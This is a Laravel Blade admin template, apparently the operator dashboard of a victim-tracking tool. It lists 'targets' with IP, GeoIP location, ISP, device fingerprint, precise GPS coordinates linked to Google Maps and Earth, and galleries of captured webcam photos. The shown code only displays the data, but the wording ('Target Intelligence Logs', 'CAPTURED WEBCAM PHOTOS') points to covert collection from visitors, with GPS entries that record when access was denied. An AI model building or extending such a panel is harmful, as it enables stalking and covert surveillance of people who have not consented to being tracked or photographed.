@extends('layouts.admin')

@section('title', 'Target Logs')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Top Header -->
    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
            <h1 class="text-2xl font-bold text-white tracking-tight">Target Intelligence Logs</h1>
            <p class="text-zinc-400 text-sm mt-1">Detailed visitor telemetry, device fingerprints, and geolocation data.</p>
        </div>

        <div class="flex items-center gap-2">
            <form action="{{ route('admin.logs.clear') }}" method="POST" onsubmit="return confirm('Are you sure you want to delete ALL telemetry logs and snapshots? This action cannot be undone.');">
                @csrf
                <button type="submit" class="px-3.5 py-2 text-xs font-medium bg-red-950/50 hover:bg-red-900/80 text-red-300 border border-red-800/50 rounded-xl transition">
                    <i class="fa-solid fa-trash mr-1"></i> Clear All Logs
                </button>
            </form>
        </div>
    </div>

    <!-- Filters & Search -->
    <div class="p-4 bg-zinc-900 rounded-2xl border border-zinc-800">
        <form action="{{ route('admin.logs') }}" method="GET" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3">
            <div>
                <input type="text" name="search" value="{{ request('search') }}" placeholder="Search IP, City, ISP, UUID..."
                       class="w-full px-3.5 py-2 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-pink-500">
            </div>

            <div>
                <select name="filter_gps" class="w-full px-3.5 py-2 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-zinc-300 focus:outline-none focus:border-pink-500">
                    <option value="">-- All GPS Status --</option>
                    <option value="yes" {{ request('filter_gps') === 'yes' ? 'selected' : '' }}>GPS Coordinates Captured</option>
                    <option value="no" {{ request('filter_gps') === 'no' ? 'selected' : '' }}>No GPS / Denied</option>
                </select>
            </div>

            <div>
                <select name="filter_cam" class="w-full px-3.5 py-2 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-zinc-300 focus:outline-none focus:border-pink-500">
                    <option value="">-- All Camera Status --</option>
                    <option value="yes" {{ request('filter_cam') === 'yes' ? 'selected' : '' }}>Has Webcam Snapshots</option>
                </select>
            </div>

            <div class="flex gap-2">
                <button type="submit" class="flex-1 py-2 px-4 bg-zinc-800 hover:bg-zinc-700 text-white rounded-xl text-xs font-medium transition">
                    <i class="fa-solid fa-filter mr-1"></i> Filter
                </button>
                @if(request()->hasAny(['search', 'filter_gps', 'filter_cam']))
                    <a href="{{ route('admin.logs') }}" class="py-2 px-3 bg-zinc-800/50 hover:bg-zinc-800 text-zinc-400 rounded-xl text-xs flex items-center justify-center transition" title="Reset">
                        <i class="fa-solid fa-rotate-left"></i>
                    </a>
                @endif
            </div>
        </form>
    </div>

    <!-- Logs Table -->
    <div class="rounded-2xl bg-zinc-900 border border-zinc-800 overflow-hidden shadow-xl">
        <div class="overflow-x-auto scrollbar-slim">
            <table class="w-full text-left text-xs">
                <thead class="bg-zinc-950/80 text-zinc-400 uppercase font-mono text-[10px] tracking-wider border-b border-zinc-800">
                    <tr>
                        <th class="p-4">UUID / Target IP</th>
                        <th class="p-4">Location (GeoIP)</th>
                        <th class="p-4">Hardware & Specs</th>
                        <th class="p-4">GPS Coordinates</th>
                        <th class="p-4">Webcam</th>
                        <th class="p-4">Captured At</th>
                        <th class="p-4 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-zinc-800/60 text-zinc-300">
                    @forelse($logs as $log)
                        <tr class="hover:bg-zinc-850/60 transition">
                            <td class="p-4 font-mono">
                                <div class="font-bold text-white text-sm">{{ $log->ip }}</div>
                                <div class="text-[10px] text-pink-400/80 truncate max-w-[140px]" title="{{ $log->uuid }}">{{ $log->uuid }}</div>
                            </td>

                            <td class="p-4">
                                <div class="font-medium text-zinc-200">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                <div class="text-[11px] text-zinc-400">{{ $log->region_name ?? '' }} ({{ $log->country_code ?? '' }})</div>
                                <div class="text-[10px] text-zinc-500 truncate max-w-[180px]">{{ $log->isp ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                <div class="text-zinc-200">{{ $log->platform ?? 'Unknown OS' }}</div>
                                <div class="text-[11px] text-zinc-400">Screen: {{ $log->screen_resolution ?? 'N/A' }}</div>
                                <div class="text-[10px] text-zinc-500">RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }} | Cores: {{ $log->cpu_cores ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                @if($log->gps_lat && $log->gps_lon)
                                    <div class="space-y-1">
                                        <div class="font-mono text-[11px] text-amber-300">{{ $log->gps_lat }}, {{ $log->gps_lon }}</div>
                                        <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank"
                                           class="inline-flex items-center px-2 py-0.5 rounded bg-amber-950/60 border border-amber-800/60 text-amber-300 text-[10px] hover:bg-amber-900/60 transition">
                                            <i class="fa-solid fa-map-location mr-1"></i> Google Maps
                                        </a>
                                    </div>
                                @elseif($log->gps_error)
                                    <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] bg-red-950/40 text-red-400 border border-red-800/40" title="{{ $log->gps_error }}">
                                        Denied / Error
                                    </span>
                                @else
                                    <span class="text-zinc-500 font-mono">-</span>
                                @endif
                            </td>

                            <td class="p-4">
                                @if($log->snapshots->isNotEmpty())
                                    <button onclick="viewSnapshots({{ $log->id }})" class="inline-flex items-center px-2.5 py-1 rounded-md bg-pink-950/60 border border-pink-800/60 text-pink-300 text-xs font-mono hover:bg-pink-900/60 transition">
                                        <i class="fa-solid fa-images mr-1.5"></i> {{ $log->snapshots->count() }} photos
                                    </button>
                                @else
                                    <span class="text-zinc-500 font-mono">0</span>
                                @endif
                            </td>

                            <td class="p-4 font-mono text-zinc-400 text-[11px]">
                                {{ $log->created_at->format('Y-m-d H:i:s') }}
                            </td>

                            <td class="p-4 text-right">
                                <div class="flex items-center justify-end gap-1.5">
                                    <button onclick="openDetailModal({{ $log->id }})" class="px-2.5 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs transition" title="Inspect Full Telemetry">
                                        <i class="fa-solid fa-eye"></i>
                                    </button>
                                    <form action="{{ route('admin.logs.delete', $log->id) }}" method="POST" onsubmit="return confirm('Delete this target record?');" class="inline">
                                        @csrf
                                        @method('DELETE')
                                        <button type="submit" class="px-2.5 py-1.5 bg-red-950/40 hover:bg-red-900/60 text-red-400 border border-red-800/40 rounded-lg text-xs transition" title="Delete">
                                            <i class="fa-solid fa-trash-can"></i>
                                        </button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="7" class="p-12 text-center text-zinc-500">
                                No logs match the specified search or filter criteria.
                            </td>
                        </tr>
                    @endforelse
                </tbody>
            </table>
        </div>

        @if($logs->hasPages())
            <div class="p-4 border-t border-zinc-800 bg-zinc-950/50">
                {{ $logs->links() }}
            </div>
        @endif
    </div>

</div>

<!-- Telemetry Modal -->
<div id="detailModal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4">
    <div class="bg-zinc-900 border border-zinc-800 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
        <div class="flex items-center justify-between border-b border-zinc-800 pb-3">
            <h3 class="text-lg font-bold text-white flex items-center gap-2">
                <i class="fa-solid fa-fingerprint text-pink-500"></i> Target Technical Details
            </h3>
            <button onclick="closeDetailModal()" class="text-zinc-400 hover:text-white text-lg">
                <i class="fa-solid fa-xmark"></i>
            </button>
        </div>

        <div id="modalContent" class="space-y-4 text-xs font-mono">
            <div class="text-center py-8 text-zinc-500">Loading details...</div>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
function openDetailModal(id) {
    const modal = document.getElementById('detailModal');
    const content = document.getElementById('modalContent');
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    content.innerHTML = '<div class="text-center py-8 text-zinc-500">Loading details...</div>';

    fetch(`/admin/logs/${id}`)
        .then(r => r.json())
        .then(data => {
            const l = data.log;
            let snapsHtml = '';
            if (data.snapshots && data.snapshots.length > 0) {
                snapsHtml = '<div class="mt-4"><div class="text-zinc-400 font-semibold mb-2">CAPTURED WEBCAM PHOTOS:</div><div class="grid grid-cols-3 gap-2">';
                data.snapshots.forEach(s => {
                    snapsHtml += `<a href="${s.url}" target="_blank"><img src="${s.url}" class="rounded-lg border border-zinc-800 object-cover h-24 w-full hover:scale-105 transition" /></a>`;
                });
                snapsHtml += '</div></div>';
            }

            content.innerHTML = `
                <div class="grid grid-cols-2 gap-3 text-zinc-300">
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">IP ADDRESS</span>
                        <span class="text-pink-400 font-bold">${l.ip || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">GEO LOCATION</span>
                        <span>${l.city || 'N/A'}, ${l.country || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">ISP & ORG</span>
                        <span>${l.isp || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">PLATFORM / OS</span>
                        <span>${l.platform || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">HARDWARE</span>
                        <span>RAM: ${l.ram ? l.ram + 'GB' : 'N/A'} | CPU: ${l.cpu_cores || 'N/A'} Cores</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block">SCREEN & LANG</span>
                        <span>${l.screen_resolution || 'N/A'} (${l.browser_language || 'N/A'})</span>
                    </div>
                </div>

                <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                    <span class="text-zinc-500 block mb-1">USER AGENT</span>
                    <span class="text-[11px] text-zinc-300 break-all">${l.user_agent || 'N/A'}</span>
                </div>

                ${l.gps_lat ? `
                <div class="p-3 bg-amber-950/30 rounded-xl border border-amber-800/40">
                    <span class="text-amber-400 font-bold block mb-1">GPS SATELLITE TELEMETRY</span>
                    <div>Lat: ${l.gps_lat}, Lon: ${l.gps_lon} (Accuracy: ${l.gps_accuracy || 'N/A'}m)</div>
                    <div class="mt-2">
                        <a href="https://www.google.com/maps/place/${l.gps_lat},${l.gps_lon}" target="_blank" class="text-amber-300 underline mr-4">Google Maps &rarr;</a>
                        <a href="https://earth.google.com/web/search/${l.gps_lat},${l.gps_lon}" target="_blank" class="text-amber-300 underline">Google Earth &rarr;</a>
                    </div>
                </div>` : ''}

                ${snapsHtml}
            `;
        });
}

function viewSnapshots(id) {
    openDetailModal(id);
}

function closeDetailModal() {
    const modal = document.getElementById('detailModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}
</script>
@endsection
